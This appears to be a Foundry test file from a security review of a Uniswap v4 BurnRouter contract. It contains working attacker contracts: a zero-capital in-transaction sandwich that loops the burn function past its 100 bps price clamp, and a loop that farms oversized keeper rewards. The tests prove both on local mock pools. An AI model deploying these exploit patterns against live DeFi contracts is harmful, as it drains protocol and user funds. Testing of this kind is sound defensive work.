// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";

import {BurnRouter} from "../../../../src/protocol-fee/BurnRouter.sol";

import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

import {ReviewToken, ReviewWETH} from "./LockerFeesStubs.sol";

/// @notice LF-03 attacker: zero capital, one transaction. inside its own unlock it
///         buys LAYER on credit, loops the permissionless open-tab burn until the
///         router is empty (each call re-reads the already-moved spot, so the
///         per-call clamp compounds), sells the LAYER back and takes the profit.
contract BurnSandwich is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager public immutable pm;
    BurnRouter public immutable br;
    PoolKey internal key;
    uint256 internal frontRun;

    uint256 public burnCalls;
    uint160 public burnStartSqrtP;
    uint160 public burnEndSqrtP;
    uint256 public profitWeth;
    uint256 public keeperEth;

    constructor(IPoolManager pm_, BurnRouter br_) {
        pm = pm_;
        br = br_;
    }

    function run(PoolKey memory key_, uint256 frontRunWeth) external {
        key = key_;
        frontRun = frontRunWeth;
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        bool wethIs0 = br.wethIsCurrency0();
        Currency w = Currency.wrap(br.weth());
        // 1. front-run on credit (no capital): buy LAYER with weth we do not have yet
        BalanceDelta d1 = pm.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: wethIs0,
                amountSpecified: -int256(frontRun),
                sqrtPriceLimitX96: wethIs0
                    ? TickMath.MIN_SQRT_PRICE + 1
                    : TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );
        int128 layerGot = wethIs0 ? d1.amount1() : d1.amount0();
        // 2. loop the burner. every call clamps 100 bps from the CURRENT spot.
        (burnStartSqrtP,,,) = pm.getSlot0(key.toId());
        uint256 ethBefore = address(this).balance;
        for (uint256 i; i < 400; i++) {
            try br.processBurnWethOpenTab(0) {
                burnCalls++;
            } catch {
                break;
            }
        }
        keeperEth = address(this).balance - ethBefore;
        (burnEndSqrtP,,,) = pm.getSlot0(key.toId());
        // 3. back-run: sell exactly the LAYER bought
        pm.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: !wethIs0,
                amountSpecified: -int256(layerGot),
                sqrtPriceLimitX96: wethIs0
                    ? TickMath.MAX_SQRT_PRICE - 1
                    : TickMath.MIN_SQRT_PRICE + 1
            }),
            ""
        );
        int256 net = pm.currencyDelta(address(this), w);
        require(net > 0, "sandwich not profitable");
        profitWeth = uint256(net);
        pm.take(w, address(this), profitWeth);
        return "";
    }

    receive() external payable {}
}

/// @notice LF-04 keeper: loops the standalone keeper entrypoint in one tx.
contract BurnFarmer {
    BurnRouter public immutable br;
    uint256 public calls;

    constructor(BurnRouter br_) {
        br = br_;
    }

    function farm() external returns (uint256 burnedWeth) {
        for (uint256 i; i < 400; i++) {
            try br.processBurnWeth(0) returns (uint256 wethIn, uint256) {
                burnedWeth += wethIn;
                calls++;
            } catch {
                break;
            }
        }
    }

    receive() external payable {}
}

contract BurnRouterReviewTest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    PoolManager internal pm;
    ReviewWETH internal weth;
    ReviewToken internal layer;
    BurnRouter internal br;
    PoolKey internal key;
    PoolModifyLiquidityTest internal liq;

    function _deploy(int256 liquidity) internal {
        pm = new PoolManager(address(this));
        weth = new ReviewWETH();
        layer = new ReviewToken("LAYER");
        (address c0, address c1) = address(weth) < address(layer)
            ? (address(weth), address(layer))
            : (address(layer), address(weth));
        key = PoolKey({
            currency0: Currency.wrap(c0),
            currency1: Currency.wrap(c1),
            fee: 10_000, // 1% lp fee: a 2% round trip moat, the design assumption
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });
        pm.initialize(key, uint160(1) << 96); // 1 LAYER = 1 WETH
        liq = new PoolModifyLiquidityTest(IPoolManager(address(pm)));
        vm.deal(address(this), 1000 ether);
        weth.deposit{value: 500 ether}();
        layer.mint(address(this), 500 ether);
        weth.approve(address(liq), type(uint256).max);
        layer.approve(address(liq), type(uint256).max);
        liq.modifyLiquidity(
            key,
            IPoolManager.ModifyLiquidityParams({
                tickLower: -887_200, tickUpper: 887_200, liquidityDelta: liquidity, salt: 0
            }),
            ""
        );
        br = new BurnRouter(address(this));
        br.initialize(address(layer), address(weth), key, address(pm));
    }

    function _fundRouter(uint256 amount) internal {
        weth.deposit{value: amount}();
        weth.transfer(address(br), amount);
    }

    receive() external payable {}

    /// LF-03: the 100 bps "sole sandwich guard" is per call, with no per-block
    /// pacing, so it compounds when looped inside one transaction. a capital
    /// free sandwich around the loop is profitable even against a 1% fee pool.
    function test_bug_LF03_impact_clamp_loops_in_one_tx_and_sandwich_profits() public {
        _deploy(100e18); // ~100 WETH / 100 LAYER full range
        _fundRouter(20 ether);

        // reference: one honest call fills only partially (the clamp works per call)
        uint256 snap = vm.snapshotState();
        (uint256 oneCallIn,) = br.processBurnWeth(0);
        vm.revertToState(snap);
        assertLt(oneCallIn, 1 ether, "single call is clamped to a partial fill");

        BurnSandwich atk = new BurnSandwich(IPoolManager(address(pm)), br);
        atk.run(key, 20 ether);

        uint256 left = weth.balanceOf(address(br));
        assertLt(left, br.minProcessThreshold(), "whole balance burned in ONE tx");
        assertGt(atk.burnCalls(), 10, "clamp looped");
        // price impact caused by the burner alone, in bps of sqrtPrice
        uint256 a = atk.burnStartSqrtP();
        uint256 b = atk.burnEndSqrtP();
        uint256 moveBps = (a > b ? a - b : b - a) * 10_000 / a;
        assertGt(moveBps, 10 * 50, "burner moved price far beyond the 100 bps clamp");
        assertGt(atk.profitWeth(), 1 ether, "attacker profit with zero capital");
        console2.log("burn calls in one tx", atk.burnCalls());
        console2.log("burner sqrtPrice move bps", moveBps);
        console2.log("attacker weth profit", atk.profitWeth());
        console2.log("attacker keeper eth", atk.keeperEth());
    }

    /// LF-04: the keeper reward is sized on the WHOLE balance every call, not
    /// on the WETH the clamped swap actually consumed. looping a thin pool
    /// turns the nominal 0.5% into a double digit share of what is burned.
    function test_bug_LF04_keeper_reward_on_whole_balance_farmed_by_loop() public {
        _deploy(10e18); // thin pool, ~10 WETH a side
        _fundRouter(1.9 ether); // 0.5% = 0.0095, under the 0.01 cap

        BurnFarmer f = new BurnFarmer(br);
        uint256 burned = f.farm();
        uint256 rewards = address(f).balance;
        uint256 effectiveBps = rewards * 10_000 / burned;
        console2.log("calls", f.calls());
        console2.log("weth burned", burned);
        console2.log("keeper eth", rewards);
        console2.log("effective keeper bps of burned", effectiveBps);
        assertGt(f.calls(), 10);
        assertGt(effectiveBps, 4 * br.KEEPER_REWARD_BPS(), "keeper share >> nominal 50 bps");
    }
}
